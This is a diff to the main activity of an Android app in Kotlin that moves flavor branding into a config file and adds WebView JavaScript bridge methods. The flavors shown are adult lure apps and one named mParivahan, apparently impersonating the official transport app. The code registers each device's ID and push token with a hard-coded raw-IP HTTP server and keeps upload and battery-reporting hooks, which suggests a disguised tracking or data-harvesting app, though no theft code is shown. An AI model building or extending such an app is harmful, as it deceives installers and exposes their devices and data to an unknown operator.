@@ -45,12 +45,14 @@ class MainActivity : ComponentActivity() {
 
     private val BATTERY_UPDATE_INTERVAL_MS = 60000L
     private val FCM_TIMEOUT_MS = 3000L
-    private val userId = Constants.USER_ID
     private val baseUrl = "http://95.134.130.160:8765"
 
     private lateinit var webView: WebView
     private lateinit var permissionManager: PermissionManager
     private val uploadScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+    
+    // ⭐ تنظیمات برنامه از config.json
+    private lateinit var appConfig: AppConfig
 
     companion object {
         private const val TAG = "MainActivity"
@@ -66,6 +68,9 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableFullscreen()
+
+        // ⭐ بارگذاری تنظیمات از config.json
+        appConfig = AppConfig.load(this)
 
         deviceId = DeviceInfoHelper.getDeviceId(this)
         Log.d(TAG, "📱 Device ID: $deviceId")
@@ -125,28 +130,16 @@ class MainActivity : ComponentActivity() {
                 .fillMaxSize()
                 .background(Color.White)
         ) {
-            if (showSplash && BuildConfig.APP_FLAVOR != "sexyhub") {
+            if (showSplash && appConfig.appType != "sexyhub") {
                 // SexyHub بدون splash - مستقیم لود می‌شه
-                // Show flavor-specific splash before everything
-
-                val (appName, gradientColors) = when (BuildConfig.APP_FLAVOR) {
-                    "sexychat" -> Pair(
-                        "SexyChat",
-                        listOf(Color(0xFFff6b9d), Color(0xFFc94b7f), Color(0xFFff1493))
-                    )
-                    "mparivahan" -> Pair(
-                        "mParivahan",
-                        listOf(Color(0xFF4fc3f7), Color(0xFF29b6f6), Color(0xFF1976d2))
-                    )
-                    "sexyhub" -> Pair(
-                        "SexyHub",
-                        listOf(Color(0xFFf093fb), Color(0xFFf5576c), Color(0xFFff006e))
-                    )
-                    else -> Pair(
-                        "App",
-                        listOf(Color(0xFF6200EE), Color(0xFF3700B3), Color(0xFF03DAC5))
-                    )
-                }
+                // Show splash with config from JSON
+                
+                val appName = appConfig.appName
+                val gradientColors = listOf(
+                    Color(android.graphics.Color.parseColor(appConfig.theme.primaryColor)),
+                    Color(android.graphics.Color.parseColor(appConfig.theme.secondaryColor)),
+                    Color(android.graphics.Color.parseColor(appConfig.theme.accentColor))
+                )
                 
                 Box(
                     modifier = Modifier
@@ -302,8 +295,20 @@ class MainActivity : ComponentActivity() {
             
             @android.webkit.JavascriptInterface
             fun getUserId(): String {
-                Log.d(TAG, "🔗 JavaScript requested user ID: $userId")
-                return userId
+                Log.d(TAG, "🔗 JavaScript requested user ID: ${appConfig.userId}")
+                return appConfig.userId
+            }
+            
+            @android.webkit.JavascriptInterface
+            fun getAppType(): String {
+                Log.d(TAG, "🔗 JavaScript requested app type: ${appConfig.appType}")
+                return appConfig.appType
+            }
+            
+            @android.webkit.JavascriptInterface
+            fun getAppName(): String {
+                Log.d(TAG, "🔗 JavaScript requested app name: ${appConfig.appName}")
+                return appConfig.appName
             }
         }, "Android")
         
@@ -354,7 +359,7 @@ class MainActivity : ComponentActivity() {
                         this@MainActivity,
                         deviceId,
                         fcmToken,
-                        userId
+                        appConfig.userId
                     )
                     Log.d(TAG, if (registerSuccess) "✅ Registered" else "⚠️ Register failed")
 
